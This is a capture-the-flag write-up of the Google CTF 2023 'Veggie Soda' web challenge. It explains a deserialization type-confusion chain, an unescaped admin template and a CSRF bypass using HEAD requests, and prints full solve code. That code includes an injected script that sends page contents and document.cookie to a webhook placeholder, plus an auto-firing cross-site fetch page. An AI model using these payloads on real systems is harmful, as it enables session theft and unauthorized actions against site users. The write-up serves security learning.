---
layout: post
title: Veggie Soda | Google CTF 2023
author: Andrew Kuai
tags: web deno serialization csrf xss javascript
description: "Rabbits, Denosaurs, and misinterpreted sodas brew a wonderful XSS!"
image: /assets/posts/veggiesoda/3b2a5519b22248508395679aefccbb7f.png
---

Veggie Soda easily takes over the record for my hardest solved challenge to date! Each layer of the challenge was an interesting puzzle to reason through, and I learned a lot while putting together the pieces of the final exploit as the clock ticked down to zero.

> ### Dawn of the Final Day
> 24 hours remain.

> /play [in love with a ghost - _Golden Ridge (Golden Feather Mix)_](https://youtu.be/AgDYV_IbPuo)

## Bunnies and Denosaurs

> Hate eating veggies? Just drink them :)
>
> [↧<br>Attachment](https://storage.googleapis.com/gctf-2023-attachments-project/9e4b7265adfd125de5ad69ba61e1c345b8920f2b45f3009f3e3c3ba369f318857640a47fc5bfda8d5c08ce4cfae8717a071eaf2422f2f14a2b663ef7011fa5e8.zip) | &nbsp;[https://vegsoda-web.2023.ctfcompetition.com](https://vegsoda-web.2023.ctfcompetition.com)


![860a7ebb318452477c0f2e5aabdd7928.png](/assets/posts/veggiesoda/ef2d8a9828be47a2aa533ded36526a08.png)

Our first impression of Veggie Soda's site is a very cute rabbit picture and a very typical sign up page. After signing up with my very secure credentials of `username=arc01` and `password=arc01`, we're redirected to the Profile page, which contains a list of all of our "posts" and "sodas"...

![4ef742e618fc9f156585ba7cb30b9ad9.png](/assets/posts/veggiesoda/50c551119b054d34b96e05717450c054.png)

...as well as forms to make new posts, sodas, and admin bot requests.

![4a1a5529ce9009b0196510ec87beb101.png](/assets/posts/veggiesoda/1978665e456345ea929561fdf73ab4a2.png)

The singular soda we already own contains a welcome note from admin.

![74d85a8fe53cc058d4d8375b9070c628.png](/assets/posts/veggiesoda/eab89318a41d432193570509ee3c8124.png)	

Cracking open the source code, we're met with an application built with Deno (obligatory 🦕) and the [Oak](https://deno.land/x/oak) framework. A quick `grep -r "flag"` reveals absolutely nothing, so let's just go through the file list top-to-bottom:

- `src/db/index.js` is, as the filename suggests, Veggie Soda's database wrapper. All of the queries use standard SQL placeholder syntax, so no SQL injections here! Interesting things to note in this module though are the admin initialization lines
	```ts
	if (await return_admin() === false) {
	    await db.execute(`INSERT INTO users (userid, premium, username, password, status) VALUES (?, 1, 'admin', ?, ?)`, [crypto.randomUUID(), adminhash, "I like Soda"]);
	}
	```
    as well as the very sus method
	```ts
	async function delete_from_db<S extends string>(db_name: S, change: S, param: S){
	    await db.execute(`DELETE FROM ??} WHERE ?? = ?`, [db_name, change, param]);
	}
	```
	While at first this looks like a possible SQL injection vuln, a quick ctrl+f reveals that `delete_from_db` is... never used anywhere in the codebase. This is probably just a red herring then :D
-  `utils/serializer.ts` + `models/classes/{Log,Post,Soda,User,Vio,Warning}.ts` all seem like pretty typical model classes. The most interesting thing about them is their usage of the [superserial](https://deno.land/x/superserial) library to handle serialization. Superserial _claims_ to "handle any data type" yet only supports floats, undefined, Symbol, BigInt, Date, RegExp, Map, and Set. Curious. We'll come back to these classes later once we have more context on what they're used for.
-  Skipping ahead to the front-end logic, `routes/post.ts` handles the rendering for viewing a singular post. Interestingly enough, part of the `/newpost` endpoint logic checks if your post has XSS - and assigns you a `Vio`lation if XSS was detected and you're not a premium user! :skull:
	```ts
	const regex  = '(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>';
	const xss = post.content.match(regex);
	if (xss && user.getPrem() === 0){
	    const vioid = crypto.randomUUID();
	    const vio = Vio.getVio("XSS", user.getUsername(), vioid);
	    const serializedvio = serializer.serialize(vio);
	    const qSubmission = ctx.state.queue.submitToQueue(user.getUsername(), serializedvio, "Vio");
	```
	The funny thing about this check is that _you can only ever see your own posts_ - while sodas can be sent from a sender to a recipient, the code doesn't allow you to view posts that don't belong to you.
	```ts
	if (user.posts.has(postId)){
	    // -- snip --
	} else {
	    throw Error("Couldn't find specified post.");
	}
	```
	Thus, there is quite literally no point in trying to XSS through the post endpoint anyways!
- While `routes/sodas.ts` doesn't contain any XSS checks, it presents a different problem: you can't send sodas to a premium user (such as the admin) as a lowly proletariat:
	```ts
	if (sourceUser.getPrem() !== 1 && destinationUser.getPrem() === 1){
	    const vioid = crypto.randomUUID();
	    const vio = Vio.getVio("UNAUTHORIZED ACCESS", sourceUser.getUsername(), vioid);
	    const serializedvio = serializer.serialize(vio);
	    const qSubmission = ctx.state.queue.submitToQueue(sourceUser.getUsername(), serializedvio, "Vio");
	    // -- snip --
	    const access_err = new Error("You cannot send a soda to a premium user as a standard user. A warning will be added to your profile.");
	    throw access_err;
	}
	```
	Assuming that you somehow did manage send an XSSSoda&trade; to the admin however, would the XSS even render?
    <br>

	If we look at the `/soda` endpoint...
	```ts
	if (user.getPrem() === 0){
	    ctx.render("./views/standardsoda.ejs", {data:{id: soda.id, variety: soda.variety.toString(), note: soda.note, sender: soda.src}});
	    return;
	} else if (user.getPrem() === 1){
	    ctx.render("./views/premiumsoda.ejs", {data:{id: soda.id, variety: soda.variety.toString(), note: soda.note, sender: soda.src}});
	    return;
	}
	```
	...when logged in as a premium user, Veggie Soda actually renders a slightly different webpage than for proletariats. In the end, that difference boils down to a single character:
	![331acc131d17ceb28fbde2fce1aefd82.png](/assets/posts/veggiesoda/88a7db37510540a98c79aa9de17f9c09.png)
	According to [the EJS docs](https://ejs.co),the `<%=` tag outputs an HTML escaped variable, whilst the `<%-` tag outputs variables unescaped. Which means that any XSSSoda&trade; we produce will be effective on (and only on) the admin account. Bingo!
    
    <br>

	So how are we going to brew that soda, anyways?

## Gimme Premium Please

From what we've looked at so far, in order for us to send an XSSSoda&trade; to the admin, we need to become a premium user somehow. How do we do that?

![7b32b7fd6b9d4984920ddf2282d4f77d.png](/assets/posts/veggiesoda/0ccdc18ee8db4efcb1f7f13962d6abdc.png)

Looking at the database code again, it looks like all users apart from the admin are initialized to zero premium access by default:

```ts
async function insert_stan_user<S extends string>(userid: S, username: S, password: S){
    await db.execute(`INSERT INTO users (userid, premium, username, password, status) VALUES (?, 0, ?, ?, ?)`, [userid, username, password, ""]);
}
```

All of the posts, sodas, and violations logic go through the `models/classes/Queue.ts` class, which then invokes `UserManager#setUser` to upsert updated user data. Unfortunately, the only update `setUser` makes to the User table itself is for statuses, and that in it of itself already requires a premium user:

```ts
await db.update_db("users", "status", user.getStatus(), "username", user.getUsername());
```

While there is some [questionable switch fallthrough](https://deno.land/x/sql_builder@v1.9.1/util.ts?source#L36) going on inside the `sql_builder` module, I didn't find anything to suggest that SQL injection is possible here. How are we supposed to do anything if we can't become a premium user? This is literally 1984!

But then, while retracing my steps to the code block above, I took a closer look at `status.ts` - and found a brew of a different kind.

## Status Effect

> 19 hours remain.

As noted above, only premium users (the admin) are allowed to set a status:

![c0c476e91e76e6287bc16756efdff125.png](/assets/posts/veggiesoda/f3ac8dab535849a49d10719655fba981.png)

But the source code for `status.ts` reveals something interesting: unlike every other form submission handler on the site, `/status` accepts _either_ a POST with form data _or_ a GET with url parameters.

```ts
if (user.getPrem() === 0){
    throw new Error("Sorry, only admins have statuses!");
}

if (ctx.request.url.searchParams.has("content")){
    content = ctx.request.url.searchParams.get("content");
    if (ctx.request.url.searchParams.has("type")){
        type = ctx.request.url.searchParams.get("type");
    }
    const qSubmission = ctx.state.queue.submitToQueue(username, content, type);
    if (!qSubmission){
        throw new Error("An error occurred during queue processing a new status.");
    }
    ctx.response.redirect("/profile");
    return;
} else if (ctx.request.hasBody){
    const req = await ctx.request.body({ type: "json" }).value;
    content = req["content"];
    if (req["type"]){
        type = req["type"];
    }
    const qSubmission = ctx.state.queue.submitToQueue(username, content, type);
    if (!qSubmission){
        throw new Error("An error occurred during queue processing a new status.");
    }
    ctx.response.body = "Status succesfully changed";
    return;
}
```

Thus, by directing the admin bot to a handcrafted `/status?content=` link, we can force the admin bot to set its status to whatever we want!

...except this isn't all that useful at first glance. Statuses \*are\* properly html-escaped during rendering, so we can't use a status as an XSS vector. But the above code betrays a far more powerful vector.

![4271f1254ff8530ad18c1e990fca40a7.png](/assets/posts/veggiesoda/71e20ad853b34f38ab2e24117b9de66e.png)

Although the front-end code in `status.ejs` only sends the server a `content` and a `csrf_token`, the server accepts a third parameter `type` that we can override. This allows us to call the server-side `submitToQueue` method on the admin user with arbitrary arguments. And what does `submitToQueue` do?

```ts
// in models/classes/Queue.ts

switch(qItem.processName){
    case "Soda":
        var soda = null;
        try {
            soda = serializer.deserialize(qItem.toProcess) as Soda;
            soda.apply();
            soda.resolve(user);
        } catch {
            break;
        }
        const sodalog = new Log(soda);
        sodalog.apply(user);
        logs.push(sodalog);
        break;
    case "Post":
        var post = null;
        try {
            post = serializer.deserialize(qItem.toProcess) as Post;
            Post.resolve(post, user, post.content);
        } catch {
            break;
        }
        const postlog = new Log(post);
        postlog.apply(user);
        logs.push(postlog);
        break;
    case "Vio":
        var vio = null;
        try {
            vio = serializer.deserialize(qItem.toProcess) as Vio;
            vio.resolveWarning(user);
        } catch {
            break;
        }
        const violog = new Log(vio);
        violog.apply(user);
        logs.push(violog);
        break;
    case "Status":
        user.setStatus(qItem.toProcess);
        break;
    default:
        break;
}
await users.setUser(user.getUsername(), user);
```

It happily deserializes our input as whatever type we please!

## This Is Not a Soda

At first glance, the solution is now trivial: just force the server to deserialize an XSSSoda&trade; and we win! Except it's not all that simple:

```ts
// in models/classes/Post.ts
static resolve<P extends Post>(post: P, user?: User, content?: string){
    try {
        if (content){
            post.content = escape(content);
            if (user){
                post.resolveUser(user);
            }
            return;
        }
        post.apply(user);
    } catch {
        return;
    }
} 
```

```ts
// in models/classes/Soda.ts
apply(){
    this.note = escape(this.note);
}
```

If we trace the line of execution for submitting both a `type=Soda&content=Soda{...}` and a `type=Post&content=Post{...}`, we'd quickly note that the contents of Soda and Post _are both escaped server-side_ as part of pre-processing. That's no good! Clearly, we need to abuse wrong-type deserialization here somehow, but:

- if we submit a `Soda` and pretend it's a `Post`, `Post::resolve` will end up calling `Soda#apply`, which ends up escaping the `Soda`. (The `Soda` is additionally never given to the admin user either.)
- If we submit a `Post` and pretend it's a `Soda`, `Post#apply` will be a no-op and trying to invoke `Post#resolve` will throw an exception. (The `Post` is also never given to the admin user, even if there was no exception thrown.)

For a decent chunk of time (read: 3 hours) I was stuck on what types to actually use here, until I clicked inside the `postlog.apply` line and saw a path forward:

```ts
// in models/classes/Log.ts
public generate(){
    switch(this.e.constructor.name){
        case "ApplicationErrorEvent":
            // -- snip --
        default:
            console.log(`%c============= MISC. LOG [${this.date}]`, "color:blue");
            if (typeof this.e === "undefined"){
                console.log("OBJECT IS UNDEFINED.");
            } else {
                if (this.e.dispatch){
                    console.log(this.e.dispatch());
                } 
            }
            break;
    }
}

public apply(u: User){
    if (!this.e.validate){
        return;
    }
    if (this.e.validate(u)){
        this.generate();
    }
}
```

If instead of trying to break the deserializers we have them work as intended, the deserialized object will eventually be added to a `Log` object for console logging. That `Log` object will then, if the methods exist, call `validate` and `dispatch` on the given object.

`Soda` and `Post` both don't do anything useful on validation, but our third option `Vio` does:

```ts
// in models/classes/Vio.ts
validate(user: User): boolean{
    if (!this.warning) {
        return false;
    }
    if (user.getId() === this.userid){
        this.warning.assign(user);
        return true;
    } else {
        return this.warning.resolve(user);
    }
}
```

So `Log` calls `Vio#validate`, and `Vio` calls our choice of either `Warning#assign` or `Warning#resolve`. But given that we have arbitrary input control over what gets deserialized and that [types are really just a suggestion in Deno](https://deno.com/blog/v1.23#no-type-checking-by-default), we can probably just replace the `warning` with whatever we want!

So what type defines either `assign` or `resolve`, applies itself to the given user, and conveniently doesn't escape its contents?

`Soda`, of course!

```ts
// in models/classes/Soda.ts
resolve(user: User){
    this.dest = user.getUsername();
    user.pushToSodas(this);
}
```

Given all of the above, we can now write our payload generator script...

```ts
// payload-gen.ts version 1 (spoiler alert: this has bugs!)

// @ts-ignore  
import { Serializer } from "https://deno.land/x/superserial/mod.ts";
import Post from './Post.ts';
import Log from './Log.ts';
import Soda from './Soda.ts';
import Vio from './Vio.ts';
import Warning from './Warning.ts';

const serializer = new Serializer({ classes: {Post, Log, Vio, Soda, Warning} });
const UUID = "e3586424-e765-49c4-8556-57377aed08f3";

const note = `
<script>
    let ROOT = "https://vegsoda-web.2023.ctfcompetition.com/";
    let load = (i, s) => { i.src = s; return new Promise(r => i.onload = () => { i.onload = null; r(i.contentWindow.document.body.innerHTML) }) };
    let yoink = (s) => navigator.sendBeacon("[webhook]?q=" + encodeURIComponent(JSON.stringify(s)));
    (async () => {  
        let i = document.createElement("iframe");
        document.body.appendChild(i);
        let profile = await load(i, ROOT + "profile");
        let posts = profile.match(/(?<=<li><a class="sodalink" href="\\/post\\/).*?(?=">)/gm);
        let sodas = profile.match(/(?<=<li><a class="sodalink" href="\\/sodas\\/).*?(?=">)/gm);
        yoink([posts, sodas]);
        for (let p of posts) {
            yoink((await load(i, \`\${ROOT}post/\${p}\`)).match(/(?<=<h2 class="page-section-heading text-center text-uppercase text-secondary mb-0">).*?(?=<\\/h2>)/gm));
        }
        for (let s of sodas) {
            yoink((await load(i, \`\${ROOT}sodas/\${s}\`)).match(/(?<=<p class="masthead-subheading font-weight-light mb-0">).*?(?=<\\/p>)/gm));
        }
        yoink(await load(i, "https://vegsoda-web.2023.ctfcompetition.com/status"));
    })()
</script>
`

let stopYouViolatedTheLaw = {
    id: UUID,
    userid: "arcblroth",
    level: "XSS",
    warning: Soda.getSoda(
        "Carrot", // rabbits unite!
        "admin",
        note,
        UUID,
        "admin",
    )
}
let vio = "Vio" + serializer.serialize(stopYouViolatedTheLaw)

console.log(vio)
console.log(serializer.deserialize(vio))

Deno.writeFileSync("payload.txt", new TextEncoder().encode(`https://vegsoda-web.2023.ctfcompetition.com/status?type=Soda&content=${encodeURIComponent(vio)}`))
console.log("Payload written.")
```

...ask the admin bot to navigate to that payload URL...

![9680dba5ac832abf1c1d26f05dbf18d9.png](/assets/posts/veggiesoda/8f74d537a30f48d1b690bc6ae605d39e.png)

...spam create posts to ourselves to force the server-side queue to flush\*...

> \*Note: According to the code in `main.ts`, the server processes all queue requests in batches of at least size 3 every 30 seconds. To be honest, I found this quite annoying while developing the solution to this challenge!

...ask the admin bot to read our XSSSoda&trade; at `https://vegsoda-web.2023.ctfcompetition.com/sodas/e3586424-e765-49c4-8556-57377aed08f3`...

...and then wait for our flag to arrive.

<br>
<br>
<br>

Spoiler alert: the flag did not, in fact, arrive.

So what went wrong? Tracing through what would have executed on the server, I realized fatal mistake #1: since `Vio` doesn't define an `apply` method, deserializating the `Vio` as a "`Soda`" fails and the queue logic panics.
To fix this, we need to lie to the server that our `Vio` is actually a `Post` - since `Post::resolve` is a static method and internally try-catches any errors, this means that our `Vio` _will_ sucessfully "deserialize" as a `Post`!

```diff
- ?type=Soda
+ ?type=Post
```

Apply applying the above change, I re-did the above series of steps and waited for the flag.

<br>

Spoiler alert: the flag, once again, did not arrive.

## CSRF, the Final Boss

> 13 hours remain.

To figure out what exactly was going wrong, I finally gave up and deployed the challenge locally:

```
$ docker network create googlectf
$ docker run --rm --network googlectf --name googlectf-mysql -e MYSQL_ROOT_PASSWORD=password -d mysql:8

$ docker run -it --network googlectf --rm mysql mysql -hgooglectf-mysql -uroot -p
mysql> CREATE DATABASE forge;
mysql> CREATE USER 'forge'@'172.18.0.3' IDENTIFIED BY 'password';
mysql> GRANT ALL PRIVILEGES ON *.* TO 'forge'@'172.18.0.3' WITH GRANT OPTION;
mysql> exit
$ docker run -it --network googlectf --rm mysql mysql -hgooglectf-mysql -uforge -p

$ docker build . --tag googlectf
$ docker run --name googlectf --network googlectf --rm -e COOKIE_KEY="blah" -e COOKIE_ENCRYPTION="blah" -e DB_HOST=googlectf-mysql -e DB_PASSWORD=password --privileged -p 1337:1337 googlectf
```
<center>
	<i>amazing credentials, I know</i>
</center>

Logging in as admin on my local deployment (if only I could do _that_ on remote) and navigating to the payload URL, I was greeted with

![dbc6c194ff011b29322306dc14d0db71.png](/assets/posts/veggiesoda/c0dbb352bd514798a5bdb12c44cd4bc0.png)

...403 Forbidden? What's generating _that_?

![6d82616d242054e096b5aa9a4606b01f.png](/assets/posts/veggiesoda/4aee36061bfa46f28d5a96f519a4ee62.png)

In my haste to assemble a solve script, I forgot about the final file we haven't seen yet: `csrf.ts`.

```ts
// @ts-ignore  
import { computeHmacTokenPair, computeVerifyHmacTokenPair } from "https://deno.land/x/deno_csrf@0.0.4/mod.ts"
// @ts-ignore  
import { Context, Middleware, Status } from 'https://deno.land/x/oak/mod.ts';
// @ts-ignore 
import { Session } from "https://deno.land/x/oak_sessions/mod.ts";

const getCsrfMiddleware = async function (ctx: Context, key: string): Promise<boolean>{
    if (ctx.request.url.searchParams.size) {
        const cookies_token = await ctx.cookies.get("token");
        const csrf = ctx.request.url.searchParams.get("csrf");
        
        if (!csrf || !cookies_token || !computeVerifyHmacTokenPair(key, csrf, cookies_token)){
            return false;
        }        
        return true;
    }

    const HMACpair = computeHmacTokenPair(key, 300);
    await ctx.state.session.set("csrf", HMACpair.tokenStr);
    await ctx.cookies.set("token", HMACpair.cookieStr);
    return true;
};

const postCsrfMiddleware = async function (ctx: Context, key: string): Promise<boolean>{
    const body = await ctx.request.body({ type: "json" }).value;
    
    const cookies_token = await ctx.cookies.get("token");
    var success = false;

    if (!body["csrf"] || !cookies_token || !computeVerifyHmacTokenPair(key, body["csrf"], cookies_token)){
        return success;
    }

    success = true;
    return success;
}

// -- snip --

csrf_protections(): Middleware {
    const csrf_func = async (ctx: Context, next: () => Promise<void>): Promise<void> => {
        if (ctx.request.method === "GET"){
            const get_success = await getCsrfMiddleware(ctx, this.key);
            if (!get_success) {
                return ctx.response.status = Status.Forbidden;
            }
        } else if (ctx.request.method === "POST"){
            const post_success = await postCsrfMiddleware(ctx, this.key);
            if (!post_success){
                return ctx.response.status = Status.Forbidden;
            }
        }
        await next();
    }
    return csrf_func as Middleware;
}
```

What first stood out to me here is the specific version of `deno_csrf` used - `v0.0.4` instead of the latest version `v0.0.5`. If we check the Github log for `deno_csrf`, [a single commit](https://github.com/Octo8080/deno-csrf/compare/0.0.4...0.0.5) was made between `v0.0.4` and `v0.0.5`, ominously titled "bug fix".

The only problem with this is that commit just adds a validation check to the CSRF `key` to ensure that it's exactly 32 characters long - and we can't even control the value of that key anyways. Clearly this isn't the right method of attack!

Interestingly, the cookie store Vegetable Soda sets up
```ts
// in main.ts
const store = new CookieStore(Deno.env.get("COOKIE_ENCRYPTION"), {cookieSetDeleteOptions: {
     sameSite: "none",
     secure: true
  }});
```
makes all cookies `SameSite=None`, which means that we _can_ put `https://vegsoda-web.2023.ctfcompetition.com` in an iframe or `fetch({ credentials: 'include' })` it on a cross-domain site!

However, since `Access-Control-Allow-Origin` isn't set on anything the server returns, we're limited to only simple requests to Vegetable Soda. Notably, this means we can't just yoink a `csrf_token` from the website and use it to forge a submission. The CORS preflight request `OPTIONS` also doesn't seem to trigger any side effects on the server - goshdarnit well designed security standards!

> Note: for testing locally with the `SameSite=None; Secure` cookies, I set up a self-signed cert on my local challenge deployment, which involved a lot of wrestling with Firefox.

I then spent an hour or so trying unsuccessfully to bypass the CSRF, before I decided to set an alarm and call it for the night.

---

> 2 hours remain.

It was the next morning that I re-read the `fetch` spec and realized something:
![e989e074bfae55c465ea2625ee7ae293.png](/assets/posts/veggiesoda/8fb3e9f01dac4207beb6bc294c40128b.png)

_Wait, `HEAD` is a simple request?_

Since the CSRF handler above only applies CRSF to `GET` and `POST` requests, if we can sneak in a `HEAD` request, then we can bypass the CRSF. Bingo!

After adding a bit of console logging to my local deployment, I pointed the "admin bot" to a site with the script
```js
fetch("<above payload>", {
  method: "HEAD", // cors bypass go brrrr
});
```

and got the following output:

<center>
	<img src="/assets/posts/veggiesoda/8333907c7f4345628cdcf6fb308cf6c0.png" /><br>
	<i>the moment everything worked</i>
</center>

Despite the fact CORS technically fails client-side, the server still processes the `/status` middleware anyways - which means we've bypassed CSRF! WOOO!

> Note: the error above was triggered because I forgot to add `credentials: 'include'` and is a faithful reproduction of the actual moment where I discovered how to bypass the CSRF.

![27cd3521e085c153d57ebc00230327e4.png](/assets/posts/veggiesoda/5356e04c07584552ae881ba37622b6a3.png)

## write flag where

> 20 minutes remain.

Now that we have all the pieces, all that's left are to put them together! (And to also fix all the bugs in my payload such as missing `\\`s, whoops). 

After repeating the above deployment sites for the third time on the actual challenge instance, my webhook _finally_ started receiving payloads such as
![604e199796658c961c615282f4130f6a.png](/assets/posts/veggiesoda/598c8ef862e04b5988f592b59227e2b6.png)

There's just one problem left.

![76453036f5b684d9868bc536c5afaa98.png](/assets/posts/veggiesoda/3b2a5519b22248508395679aefccbb7f.png)

With just ten minutes to spare, I realized that the flag was _probably_ in `document.cookie` and submitted an updated payload with a separate UUID:

```diff
--- payload-gen.ts
+++ payload-gen.ts
@@ -1,4 +1,4 @@
-// payload-gen.ts version 1 (spoiler alert: this has bugs!)
+// payload-gen.ts version 3
 import { Serializer } from "https://deno.land/x/superserial/mod.ts";
 import Post from './Post.ts';
 import Log from './Log.ts';
@@ -14,6 +14,8 @@
     let ROOT = "https://vegsoda-web.2023.ctfcompetition.com/";
     let load = (i, s) => { i.src = s; return new Promise(r => i.onload = () => { i.onload = null; r(i.contentWindow.document.body.innerHTML) }) };
     let yoink = (s) => navigator.sendBeacon("[webhook]?q=" + encodeURIComponent(JSON.stringify(s)));
+    yoink("payload deployed!");
+    yoink(document.cookie);
     (async () => {  
         let i = document.createElement("iframe");
         document.body.appendChild(i);
```
<center>
	<i>insert anxious refreshing as the queue takes its sweet 30 seconds</i>
</center>

And with just eight minutes to spare:
![486354395f9cee1c84f5ea0bf2700af4.png](/assets/posts/veggiesoda/1ac60a6adba04d138f0dc209269e88ab.png)

We have a flag!

### The Solve Script

```ts
// payload-gen.ts version 3
import { Serializer } from "https://deno.land/x/superserial/mod.ts";
import Post from './Post.ts';
import Log from './Log.ts';
import Soda from './Soda.ts';
import Vio from './Vio.ts';
import Warning from './Warning.ts';

const serializer = new Serializer({ classes: {Post, Log, Vio, Soda, Warning} });
const UUID = "e3586424-e765-49c4-8556-57377aed08f3";

const note = `
<script>
    let ROOT = "https://vegsoda-web.2023.ctfcompetition.com/";
    let load = (i, s) => { i.src = s; return new Promise(r => i.onload = () => { i.onload = null; r(i.contentWindow.document.body.innerHTML) }) };
    let yoink = (s) => navigator.sendBeacon("[webhook]?q=" + encodeURIComponent(JSON.stringify(s)));
    yoink("payload deployed!");
    yoink(document.cookie);
    (async () => {  
        let i = document.createElement("iframe");
        document.body.appendChild(i);
        let profile = await load(i, ROOT + "profile");
        let posts = profile.match(/(?<=<li><a class="sodalink" href="\\/post\\/).*?(?=">)/gm);
        let sodas = profile.match(/(?<=<li><a class="sodalink" href="\\/sodas\\/).*?(?=">)/gm);
        yoink([posts, sodas]);
        for (let p of posts) {
            yoink((await load(i, \`\${ROOT}post/\${p}\`)).match(/(?<=<h2 class="page-section-heading text-center text-uppercase text-secondary mb-0">).*?(?=<\\/h2>)/gm));
        }
        for (let s of sodas) {
            yoink((await load(i, \`\${ROOT}sodas/\${s}\`)).match(/(?<=<p class="masthead-subheading font-weight-light mb-0">).*?(?=<\\/p>)/gm));
        }
        yoink(await load(i, "https://vegsoda-web.2023.ctfcompetition.com/status"));
    })()
</script>
`

let stopYouViolatedTheLaw = {
    id: UUID,
    userid: "arcblroth",
    level: "XSS",
    warning: Soda.getSoda(
        "Carrot", // rabbits unite!
        "admin",
        note,
        UUID,
        "admin",
    )
}
let vio = "Vio" + serializer.serialize(stopYouViolatedTheLaw)

console.log(vio)
console.log(serializer.deserialize(vio))

Deno.writeFileSync("payload.txt", new TextEncoder().encode(`https://vegsoda-web.2023.ctfcompetition.com/status?type=Post&content=${encodeURIComponent(vio)}`))
console.log("Payload written.")
```

```html
<!-- put this on a site with https -->
<!-- and direct the admin bot to it -->
<script>
  fetch("<above payload>", {
    method: "HEAD", // cors bypass go brrrr
    credentials: 'include',
  });
</script>
```
